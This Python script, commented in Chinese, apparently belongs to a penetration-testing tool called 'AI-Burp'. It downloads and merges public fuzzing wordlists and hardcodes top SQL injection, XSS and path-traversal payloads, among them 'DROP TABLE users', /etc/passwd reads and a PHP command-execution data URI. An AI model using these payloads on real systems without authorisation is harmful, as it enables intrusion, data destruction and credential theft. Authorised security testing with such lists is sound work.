#!/usr/bin/env python3
"""
从 GitHub 爬取知名安全字典
扩充 AI-Burp payload 库
"""

import requests
import os
import json
from pathlib import Path

# 知名字典仓库 (精选高质量、实用为主)
WORDLIST_REPOS = {
    # SecLists - 最全的安全字典 (精选核心文件)
    "seclists": {
        "repo": "danielmiessler/SecLists",
        "files": {
            "sqli": [
                "Fuzzing/SQLi/Generic-SQLi.txt",
                "Fuzzing/SQLi/quick-SQLi.txt",
            ],
            "xss": [
                "Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt",
                "Fuzzing/XSS/xss-payload-list.txt",
            ],
            "lfi": [
                "Fuzzing/LFI/LFI-Jhaddix.txt",
                "Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
                "Fuzzing/LFI/LFI-gracefulsecurity-windows.txt",
            ],
            "dirs": [
                "Discovery/Web-Content/common.txt",
                "Discovery/Web-Content/raft-small-directories.txt",
                "Discovery/Web-Content/raft-small-files.txt",
            ],
            "backup": [
                "Discovery/Web-Content/Common-DB-Backups.txt",
            ],
            "params": [
                "Discovery/Web-Content/burp-parameter-names.txt",
            ],
            "sensitive": [
                "Discovery/Web-Content/quickhits.txt",
            ],
        }
    },
    
    # PayloadsAllTheThings - 高质量 payload + WAF 绕过
    "payloads_all": {
        "repo": "swisskyrepo/PayloadsAllTheThings",
        "files": {
            "sqli": [
                "SQL Injection/Intruder/Auth_Bypass.txt",
            ],
            "xss": [
                "XSS Injection/Intruders/IntrudersXSS.txt",
                "XSS Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt",
            ],
            "cmdi": [
                "Command Injection/Intruder/command-execution-unix.txt",
            ],
            "traversal": [
                "Directory Traversal/Intruder/deep_traversal.txt",
                "Directory Traversal/Intruder/traversals-8-deep-exotic-encoding.txt",
            ],
        }
    },
    
    # fuzzdb - 经典 fuzz 字典
    "fuzzdb": {
        "repo": "fuzzdb-project/fuzzdb",
        "files": {
            "sqli": [
                "attack/sql-injection/detect/xplatform.txt",
                "attack/sql-injection/detect/MSSQL.txt",
                "attack/sql-injection/detect/MySQL.txt",
                "attack/sql-injection/detect/oracle.txt",
            ],
            "xss": [
                "attack/xss/xss-rsnake.txt",
                "attack/xss/xss-uri.txt",
            ],
            "lfi": [
                "attack/lfi/common-unix-httpd-log-locations.txt",
            ],
            "cmdi": [
                "attack/os-cmd-execution/command-execution-unix.txt",
            ],
        }
    },
    
    # Bo0oM/fuzz.txt - 精简高效 (骚操作字典)
    "bo0om": {
        "repo": "Bo0oM/fuzz.txt",
        "files": {
            "dirs": [
                "fuzz.txt",
            ],
        }
    },
    
    # OneListForAll - 合并字典 (精简版)
    "onelistforall": {
        "repo": "six2dez/OneListForAll",
        "files": {
            "dirs": [
                "onelistforallshort.txt",
            ],
        }
    },
}

OUTPUT_DIR = Path(__file__).parent.parent / "payloads" / "external"


def download_file(repo, filepath):
    """从 GitHub 下载文件"""
    url = f"https://raw.githubusercontent.com/{repo}/master/{filepath}"
    
    # 有些仓库用 main 分支
    try:
        r = requests.get(url, timeout=30)
        if r.status_code == 404:
            url = f"https://raw.githubusercontent.com/{repo}/main/{filepath}"
            r = requests.get(url, timeout=30)
        
        if r.status_code == 200:
            return r.text
    except Exception as e:
        print(f"   ❌ 下载失败: {e}")
    
    return None


def extract_payloads_from_markdown(content):
    """从 Markdown 文档中提取 payload (代码块)"""
    import re
    
    payloads = set()
    
    # 提取代码块内容
    code_blocks = re.findall(r'```[a-z]*\n(.*?)```', content, re.DOTALL)
    for block in code_blocks:
        for line in block.split('\n'):
            line = line.strip()
            # 过滤掉注释和空行
            if line and not line.startswith('#') and not line.startswith('//'):
                # 只保留看起来像 payload 的行
                if any(c in line for c in ["'", '"', '<', '>', '|', ';', '&', '$', '%']):
                    payloads.add(line)
    
    # 提取行内代码
    inline_codes = re.findall(r'`([^`]+)`', content)
    for code in inline_codes:
        code = code.strip()
        if len(code) > 3 and any(c in code for c in ["'", '"', '<', '>', '|', ';']):
            payloads.add(code)
    
    return payloads


def save_wordlist(category, name, content, is_markdown=False):
    """保存字典"""
    category_dir = OUTPUT_DIR / category
    category_dir.mkdir(parents=True, exist_ok=True)
    
    filepath = category_dir / f"{name}.txt"
    
    # 去重和清理
    lines = set()
    
    if is_markdown or name.endswith('.md'):
        # 从 Markdown 提取 payload
        lines = extract_payloads_from_markdown(content)
    else:
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                lines.add(line)
    
    if not lines:
        return 0
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write('\n'.join(sorted(lines)))
    
    return len(lines)


def fetch_all():
    """爬取所有字典"""
    print("=" * 60)
    print("🔍 爬取 GitHub 安全字典 (精选版)")
    print("=" * 60)
    
    stats = {}
    
    for source_name, source_info in WORDLIST_REPOS.items():
        repo = source_info['repo']
        files = source_info['files']
        
        print(f"\n📦 {source_name} ({repo})")
        print("-" * 40)
        
        for category, filepaths in files.items():
            for filepath in filepaths:
                filename = Path(filepath).stem
                print(f"   📄 {category}/{filename}...", end=" ")
                
                content = download_file(repo, filepath)
                if content:
                    # 检测是否是 Markdown
                    is_md = filepath.endswith('.md')
                    count = save_wordlist(category, f"{source_name}_{filename}", content, is_markdown=is_md)
                    
                    if count > 0:
                        print(f"✅ {count} 条")
                        if category not in stats:
                            stats[category] = 0
                        stats[category] += count
                    else:
                        print("⚠️ 无有效内容")
                else:
                    print("❌ 下载失败")
    
    # 合并同类字典
    print("\n" + "=" * 60)
    print("📊 合并字典")
    print("=" * 60)
    
    for category in stats.keys():
        merge_category(category)
    
    # 生成精简版 (top payload)
    print("\n" + "=" * 60)
    print("🎯 生成精简版 (Top Payloads)")
    print("=" * 60)
    generate_top_payloads()
    
    # 统计
    print("\n" + "=" * 60)
    print("📊 最终统计")
    print("=" * 60)
    
    total = 0
    for category, count in sorted(stats.items()):
        print(f"   {category}: {count:,} 条")
        total += count
    
    print(f"\n   总计: {total:,} 条")
    print("=" * 60)


def generate_top_payloads():
    """生成精简版 payload (最常用的)"""
    top_dir = OUTPUT_DIR / "top"
    top_dir.mkdir(parents=True, exist_ok=True)
    
    # SQLi Top 100
    sqli_top = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#",
        "1' AND '1'='1", "1' AND '1'='2",
        "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
        "1; DROP TABLE users--", "admin'--",
        "' OR ''='", "') OR ('1'='1",
        "1' ORDER BY 1--", "1' ORDER BY 10--",
        "-1' UNION SELECT 1,2,3,4,5--",
        "' AND 1=CONVERT(int,@@version)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
    ]
    
    # XSS Top 50
    xss_top = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "'-alert(1)-'", "\"-alert(1)-\"",
        "</script><script>alert(1)</script>",
        "<img src=1 onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ]
    
    # LFI Top 30
    lfi_top = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\win.ini",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain,<?php system($_GET['cmd']);?>",
        "/var/log/apache2/access.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    
    # 保存
    with open(top_dir / "sqli_top.txt", 'w') as f:
        f.write('\n'.join(sqli_top))
    print(f"   sqli_top: {len(sqli_top)} 条")
    
    with open(top_dir / "xss_top.txt", 'w') as f:
        f.write('\n'.join(xss_top))
    print(f"   xss_top: {len(xss_top)} 条")
    
    with open(top_dir / "lfi_top.txt", 'w') as f:
        f.write('\n'.join(lfi_top))
    print(f"   lfi_top: {len(lfi_top)} 条")


def merge_category(category):
    """合并同类字典"""
    category_dir = OUTPUT_DIR / category
    if not category_dir.exists():
        return
    
    all_lines = set()
    
    for filepath in category_dir.glob("*.txt"):
        if filepath.name.startswith("merged_"):
            continue
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line:
                    all_lines.add(line)
    
    # 保存合并文件
    merged_path = category_dir / f"merged_{category}.txt"
    with open(merged_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(sorted(all_lines)))
    
    print(f"   {category}: {len(all_lines)} 条 (合并)")


def list_available():
    """列出可用字典"""
    print("=" * 60)
    print("📋 可用字典源")
    print("=" * 60)
    
    for name, info in WORDLIST_REPOS.items():
        print(f"\n📦 {name}")
        print(f"   仓库: {info['repo']}")
        print(f"   分类: {', '.join(info['files'].keys())}")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "--list":
        list_available()
    else:
        fetch_all()
